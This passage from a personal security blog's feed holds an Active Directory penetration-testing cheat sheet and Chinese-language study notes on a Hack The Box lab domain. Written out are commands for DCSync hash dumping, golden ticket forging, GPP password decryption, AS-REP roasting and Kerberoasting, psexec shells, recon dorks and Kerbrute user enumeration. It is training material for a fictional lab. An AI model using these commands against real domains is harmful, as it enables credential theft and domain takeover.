(<code>dc01.ccache</code>) from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>klist</code></td><td><code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.</td></tr><tr><td><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></td><td>Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator &quot;ACADEMY-EA-DC01$&quot;@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td><td>Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code></td><td>Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt</code></td><td>Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Miscellaneous-Misconfigurations"><a href="#Miscellaneous-Misconfigurations" class="headerlink" title="Miscellaneous Misconfigurations"></a>Miscellaneous Misconfigurations</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module .\SecurityAssessment.ps1</code></td><td>Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5</code></td><td>Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</code></td><td>Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.</td></tr><tr><td><code>Get-DomainUser * | Select-Object samaccountname,description </code></td><td>PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></td><td>PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts</code></td><td>Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Group-Policy-Enumeration-amp-Attacks"><a href="#Group-Policy-Enumeration-amp-Attacks" class="headerlink" title="Group Policy Enumeration &amp; Attacks"></a>Group Policy Enumeration &amp; Attacks</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td><td>Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb -L | grep gpp</code></td><td>Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td><td>Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.</td></tr><tr><td><code>Get-DomainGPO | select displayname</code></td><td>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-GPO -All | Select DisplayName</code></td><td>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td></tr><tr><td><code>$sid=Convert-NameToSid &quot;Domain Users&quot; </code></td><td>Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO | Get-ObjectAcl | ?&#123;$_.SecurityIdentifier -eq $sid</code></td><td>PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.</td></tr><tr><td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td><td>PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></td><td>PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td><td>Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt </code></td><td>Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.</td></tr><tr><td><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></td><td>Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don’t require Kerberos pre-authentication. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Trust-Relationships-Child-gt-Parent-Trusts"><a href="#Trust-Relationships-Child-gt-Parent-Trusts" class="headerlink" title="Trust Relationships - Child &gt; Parent Trusts"></a>Trust Relationships - Child &gt; Parent Trusts</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module activedirectory</code></td><td>Used to import the <code>Active Directory</code> module. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust </code></td><td>PowerView tool used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></td><td>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td><td>Uses Mimikatz to obtain the <code>KRBTGT</code> account’s <code>NT Hash</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainSID</code></td><td>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid</code></td><td>PowerView tool used to obtain the <code>Enterprise Admins</code> group’s SID from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01.inlanefreight.local\c$</code></td><td>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td><td>Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .</td></tr><tr><td><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td><td>Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm</code></td><td>Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.</td></tr><tr><td><code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td><td>Impacket tool used to perform a DCSync attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 </code></td><td>Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep &quot;Domain SID&quot;</code></td><td>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 &quot;Enterprise Admins&quot;</code></td><td>Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group’s <code>RID</code> from a Linux-based host.</td></tr><tr><td><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td><td>Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.</td></tr><tr><td><code>export KRB5CCNAME=hacker.ccache</code></td><td>Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.</td></tr><tr><td><code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></td><td>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td></tr><tr><td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></td><td>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td></tr></tbody></table><h1 id="Trust-Relationships-Cross-Forest"><a href="#Trust-Relationships-Cross-Forest" class="headerlink" title="Trust Relationships - Cross-Forest"></a>Trust Relationships - Cross-Forest</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></td><td>PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</code></td><td>PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.</td></tr><tr><td><code> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td><td>Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td><td>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</code></td><td>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td></tr><tr><td><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></td><td>Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.</td></tr><tr><td><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td><td>Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>zip -r ilfreight_bh.zip *.json</code></td><td>Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Initial-Enumeration&quot;&gt;&lt;a href=&quot;#Initial-Enumeration&quot; class=&quot;headerlink&quot; title=&quot;Initial Enumeration&quot;&gt;&lt;/a&gt;Initial Enumeration&lt;/h1&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="cheat_sheet" scheme="https://taninluv.github.io/tags/cheat-sheet/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD</title>
    <link href="https://taninluv.github.io/2023/09/23/AD/"/>
    <id>https://taninluv.github.io/2023/09/23/AD/</id>
    <published>2023-09-23T03:54:00.000Z</published>
    <updated>2023-09-24T08:05:38.149Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sniffing out a Foothold</li><li>Initial Enumeration</li><li>Sniffing out a Foothold</li></ul><span id="more"></span><h3 id="External-Information-Gathering-Passive-Checks"><a href="#External-Information-Gathering-Passive-Checks" class="headerlink" title="External Information Gathering (Passive Checks)"></a>External Information Gathering (Passive Checks)</h3><p>外部信息收集被授权证明与可以从互联网上收集的有关公司的信息相关的风险。</p><h3 id="Internal-Testing"><a href="#Internal-Testing" class="headerlink" title="Internal Testing"></a>Internal Testing</h3><p>内部评估部分旨在通过尝试模拟Inlanefreight运营区域内的攻击向量来证明与内部主机和服务（特别是Active Directory）上的漏洞相关的风险。这一结果将使Inlanefright能够评估内部漏洞的风险以及成功利用漏洞的潜在影响。 </p><h3 id="Password-Testing"><a href="#Password-Testing" class="headerlink" title="Password Testing"></a>Password Testing</h3><p>从Inlanefreight设备捕获或由组织提供的密码文件可以加载到离线工作站上进行解密，并用于获得进一步的访问权限和实现评估目标。</p><h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><h2 id="What-Are-We-Looking-For"><a href="#What-Are-We-Looking-For" class="headerlink" title="What Are We Looking For?"></a>What Are We Looking For?</h2><p>在进行外部侦察时，我们应该寻找几个关键项目。这些信息可能并不总是公开的，但谨慎的做法是看看有什么。如果我们在渗透测试中陷入困境，回顾通过被动侦察可以获得的信息可以给我们前进所需的推动力，例如可以用于访问VPN或其他面向外部的服务的密码泄露数据。下表强调了我们在参与的这一阶段将寻找的“内容”。</p><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>IP Space</code></td><td>Valid ASN for our target, netblocks in use for the organization’s public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.</td></tr><tr><td><code>Domain Information</code></td><td>Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS&#x2F;IDS in use, etc.)</td></tr><tr><td><code>Schema Format</code></td><td>Can we discover the organization’s email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.</td></tr><tr><td><code>Data Disclosures</code></td><td>For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain <code>intranet</code> site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)</td></tr><tr><td><code>Breach Data</code></td><td>Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.</td></tr></tbody></table><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS是验证我们的范围并了解客户在其范围界定文档中未披露的可访问主机的好方法。像 <a href="https://whois.domaintools.com/">domaintools</a>,和 <a href="https://viewdns.info/">viewdns.info</a>这样的网站是很好的起点。我们可以取回许多记录和其他数据，从DNS解析到DNSSEC测试，以及该网站是否可以在更受限制的国家&#x2F;地区访问。有时我们可能会发现超出范围的其他主机，但看起来很有趣。在这种情况下，我们可以将此列表带给我们的客户，看看是否确实应该将其中任何一个包含在范围内。我们可能还会发现一些有趣的子域，它们没有在范围界定文档中列出，但位于范围内的IP地址上，因此是公平的。</p><h3 id="Public-Data"><a href="#Public-Data" class="headerlink" title="Public Data"></a>Public Data</h3><p>社交媒体可能是一个有趣数据的宝库，这些数据可以为我们提供组织结构、运营何种设备、潜在的软件和安全实施、架构等方面的线索。排名第一的是与工作相关的网站，如LinkedIn、Indeed.com和Glassdoor。简单的招聘信息往往能揭示一家公司的很多情况。</p><p>现在让我们尝试另一种方法来验证结果中的两个名称服务器。</p><pre><code class="shell-session">[!bash!]$ nslookup ns1.inlanefreight.comServer:192.168.186.1Address:192.168.186.1#53Non-authoritative answer:Name:ns1.inlanefreight.comAddress: 178.128.39.165nslookup ns2.inlanefreight.comServer:192.168.86.1Address:192.168.86.1#53Non-authoritative answer:Name:ns2.inlanefreight.comAddress: 206.189.119.186 </code></pre><p><code>#53</code>是指DNS查询的默认端口</p><p>我们现在有两个新的IP地址要添加到我们的列表中进行验证和测试。在对他们采取任何进一步行动之前，请确保他们在您的测试范围内。出于我们的目的，实际的IP地址不在扫描范围内，但我们可以被动地浏览任何网站来寻找有趣的数据。目前，这就是从DNS中枚举域信息的方法。让我们来看看公开的信息。 Inlanefreight是一家虚构的公司，我们正在使用该模块，因此没有真正的社交媒体存在。然而，如果它是真实的，我们会查看LinkedIn、Twitter、Instagram和Facebook等网站，以获取有用的信息。相反，我们将继续查看inlanefreight.com网站。 我们进行的第一次检查是查找任何文档。使用filetype:pdf-inurl:inlanefreight.com作为搜索，我们正在寻找pdf。</p><h4 id="Hunting-For-Files"><a href="#Hunting-For-Files" class="headerlink" title="Hunting For Files"></a>Hunting For Files</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/google-dorks.png" alt="image"></p><p>弹出了一个文档，所以我们需要确保记下该文档及其位置，并在本地下载一份副本进行挖掘。当我们遇到或生成文件时，最好保存文件、屏幕截图、扫描输出、工具输出等。这有助于我们保持尽可能全面的记录，而不会忘记我们在哪里看到的东西或丢失关键数据。接下来，让我们查找我们能找到的任何电子邮件地址。</p><h4 id="Hunting-E-mail-Addresses"><a href="#Hunting-E-mail-Addresses" class="headerlink" title="Hunting E-mail Addresses"></a>Hunting E-mail Addresses</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231609116.png" alt="image"></p><p>使用dork</p><p> intext：“@inlanefreight.com”inurl:inlanefreightcom，我们正在寻找任何与网站上电子邮件地址结尾相似的实例。一个很有希望的结果出现了一个联系人页面。当我们查看页面（如下图所示）时，我们可以看到一个庞大的员工列表和他们的联系信息。这些信息可能会有所帮助，因为我们可以确定这些人至少很可能是活跃的，并且仍在公司工作。</p><h4 id="E-mail-Dork-Results"><a href="#E-mail-Dork-Results" class="headerlink" title="E-mail Dork Results"></a>E-mail Dork Results</h4><p>浏览联系人页面 <a href="https://www.inlanefreight.com/index.php/contact/">contact page</a>，我们可以看到全球不同办公室员工的几封电子邮件。我们现在已经了解了他们的电子邮件命名约定（first.last）以及一些人在组织中的工作地点。这可能在以后的密码喷射攻击中很方便，或者如果社会工程&#x2F;网络钓鱼是我们参与范围的一部分。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231611087.png" alt="image-20230923161131052"></p><h4 id="Username-Harvesting"><a href="#Username-Harvesting" class="headerlink" title="Username Harvesting"></a>Username Harvesting</h4><p>我们可以使用 <a href="https://github.com/initstring/linkedin2username">linkedin2username</a>等工具从公司的LinkedIn页面中抓取数据，并创建各种用户名的混搭（flast、first.last、f.last等），这些用户名可以添加到我们的潜在密码喷洒目标列表中。</p><h4 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h4><p><a href="http://dehashed.com/">Dehashed</a> </p><p>凭证搜寻 Dehashed是一个很好的工具，可以在漏洞数据中查找明文凭据和密码哈希。我们可以在网站上搜索，也可以使用通过API执行查询的脚本。通常，我们会为那些不在使用AD auth（或内部）的面向外部的门户网站上工作的用户找到许多旧密码，但我们可能会很幸运！这是另一个可用于创建外部或内部密码喷涂用户列表的工具。 注：出于我们的目的，下面的示例数据是虚构的。</p><h1 id="Initial-Enumeration-of-the-Domain"><a href="#Initial-Enumeration-of-the-Domain" class="headerlink" title="Initial Enumeration of the Domain"></a>Initial Enumeration of the Domain</h1><p>以下是我们此时应该寻找的一些关键数据点，并记在我们选择的笔记工具中，并尽可能将扫描&#x2F;工具输出保存到文件中。</p><h4 id="Key-Data-Points"><a href="#Key-Data-Points" class="headerlink" title="Key Data Points"></a>Key Data Points</h4><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>AD Users</code></td><td>We are trying to enumerate valid user accounts we can target for password spraying.</td></tr><tr><td><code>AD Joined Computers</code></td><td>Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.</td></tr><tr><td><code>Key Services</code></td><td>Kerberos, NetBIOS, LDAP, DNS</td></tr><tr><td><code>Vulnerable Hosts and Services</code></td><td>Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)</td></tr></tbody></table><h2 id="TTPs"><a href="#TTPs" class="headerlink" title="TTPs"></a>TTPs</h2><h3 id="Identifying-Hosts"><a href="#Identifying-Hosts" class="headerlink" title="Identifying Hosts"></a>Identifying Hosts</h3><p>花点时间侦听网络，看看发生了什么。我们可以使用Wireshark和TCPDump来“密切关注”网络，看看我们可以捕获哪些主机和类型的网络流量。如果评估方法是“黑匣子”，这尤其有用。我们注意到一些ARP请求和回复、MDNS和其他基本的第二层数据包（由于我们在交换网络上，我们仅限于当前的广播域），其中一些我们可以在下面看到。这是一个很好的开始，它为我们提供了一些关于客户网络设置的信息。</p><h4 id="Start-Wireshark-on-ea-attack01"><a href="#Start-Wireshark-on-ea-attack01" class="headerlink" title="Start Wireshark on ea-attack01"></a>Start Wireshark on ea-attack01</h4><pre><code class="shell-session"> $sudo -E wireshark</code></pre><p>使用<code>sudo -E</code>的主要目的是允许在切换用户的同时继续使用原始用户的环境配置。这在某些情况下非常有用，特别是当你需要使用原始用户的路径、别名、设置或其他环境变量来运行特定命令时。</p><p>如果我们在没有GUI的主机上（这是典型的），我们可以使用tcpdump、netcreds和NetMiner等来执行相同的功能。我们还可以使用tcpdump将捕获保存到.pcap文件，将其传输到另一个主机，然后在Wireshark中打开它。</p><pre><code class="shell-session">sudo tcpdump -i ens224 </code></pre><p>Responder是一种用于侦听、分析和毒害LLMNR、NBT-NS和MDNS请求和响应的工具。它有更多的功能，但目前，我们所使用的只是处于分析模式的工具。这将被动地侦听网络，而不会发送任何中毒的数据包。我们将在后面的章节中更深入地介绍这个工具。</p><h4 id="Starting-Responder"><a href="#Starting-Responder" class="headerlink" title="Starting Responder"></a>Starting Responder</h4><pre><code class="bash">sudo responder -I ens224 -A </code></pre><h4 id="FPing-Active-Checks"><a href="#FPing-Active-Checks" class="headerlink" title="FPing Active Checks"></a>FPing Active Checks</h4><p><a href="https://fping.org/">Fping</a> </p><p>在这里，我们将从几个标志开始fping：a显示活动的目标，s在扫描结束时打印统计数据，g从CIDR网络生成目标列表，q不显示每个目标的结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ fping -asgq 172.16.5.0/23172.16.5.5172.16.5.25172.16.5.50172.16.5.100172.16.5.125172.16.5.200172.16.5.225172.16.5.238172.16.5.240     510 targets       9 alive     501 unreachable       0 unknown addresses    2004 timeouts (waiting for response)    2013 ICMP Echos sent       9 ICMP Echo Replies received    2004 other ICMP received 0.029 ms (min round trip time) 0.396 ms (avg round trip time) 0.799 ms (max round trip time)       15.366 sec (elapsed real time)</code></pre><h4 id="Nmap-Scanning"><a href="#Nmap-Scanning" class="headerlink" title="Nmap Scanning"></a>Nmap Scanning</h4><p>现在我们有了网络中活动主机的列表，我们可以进一步枚举这些主机。我们希望确定每个主机正在运行的服务，确定域控制器和web服务器等关键主机，并确定以后要探测的潜在易受攻击的主机。随着我们对AD的关注，在进行了广泛的扫描后，我们最好关注通常伴随AD服务出现的标准协议，如DNS、SMB、LDAP和Kerberos等。下面是一个简单的Nmap扫描的快速示例。</p><pre><code class="bash">sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum</code></pre><ul><li><code>-v</code>: 启用详细输出，显示更多的信息。</li><li><code>-A</code>: 启用操作系统检测、版本检测、脚本扫描等一系列高级扫描技术。</li><li><code>-iL hosts.txt</code>: 从名为<code>hosts.txt</code>的文件中读取主机列表进行扫描。<code>hosts.txt</code>应该是一个包含要扫描的主机IP地址或主机名的文本文件。</li><li><code>-oN /home/htb-student/Documents/host-enum</code>: 将扫描结果以正常格式保存到<code>/home/htb-student/Documents/host-enum</code>文件中。</li></ul><h4 id="NMAP-Result-Highlights"><a href="#NMAP-Result-Highlights" class="headerlink" title="NMAP Result Highlights"></a>NMAP Result Highlights</h4><pre><code class="shell-session">Nmap scan report for inlanefreight.local (172.16.5.5)Host is up (0.069s latency).Not shown: 987 closed tcp ports (conn-refused)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL| Issuer: commonName=INLANEFREIGHT-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2022-03-30T22:40:24| Not valid after:  2023-03-30T22:40:24| MD5:   3a09 d87a 9ccb 5498 2533 e339 ebe3 443f|_SHA-1: 9731 d8ec b219 4301 c231 793e f913 6868 d39f 7920445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)&lt;SNIP&gt;  3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: INLANEFREIGHT|   NetBIOS_Domain_Name: INLANEFREIGHT|   NetBIOS_Computer_Name: ACADEMY-EA-DC01|   DNS_Domain_Name: INLANEFREIGHT.LOCAL|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL|   DNS_Tree_Name: INLANEFREIGHT.LOCAL|   Product_Version: 10.0.17763|_  System_Time: 2022-04-04T15:12:45+00:00&lt;SNIP&gt;5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Service Unavailable|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>我们的扫描为我们提供了NetBIOS和DNS使用的命名标准，我们可以看到一些主机打开了RDP，它们为我们指明了INLANEFREIGHT的主域控制器的方向。LOCAL域（ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL）。</p><h2 id="Identifying-Users"><a href="#Identifying-Users" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><h2 id="Identifying-Users-1"><a href="#Identifying-Users-1" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><p><a href="https://github.com/ropnop/kerbrute">Kerbrute</a> 可以是域帐户枚举的一个更隐蔽的选项。它利用了这样一个事实，即Kerberos预身份验证失败通常不会触发日志或警报。我们将把Kerbrute与Insidetrust的jsmith.txt或jsmith2.txt用户列表结合使用。此存储库包含许多不同的用户列表，当从未经身份验证的角度开始枚举用户时，这些列表非常有用。我们可以将Kerbrute指向我们之前找到的DC，并为其提供一个单词列表。该工具很快，我们将收到结果，让我们知道找到的账户是否有效，这是发起密码喷涂等攻击的一个很好的起点，我们将在本模块稍后深入介绍。 为了开始使用Kerbrute，我们可以从Linux、Windows和Mac下载用于测试工具的预编译二进制文件，也可以自己编译。这通常是我们在客户端环境中引入的任何工具的最佳实践。要编译二进制文件以在我们选择的系统上使用，我们首先克隆repo：</p><h4 id="Cloning-Kerbrute-GitHub-Repo"><a href="#Cloning-Kerbrute-GitHub-Repo" class="headerlink" title="Cloning Kerbrute GitHub Repo"></a>Cloning Kerbrute GitHub Repo</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git 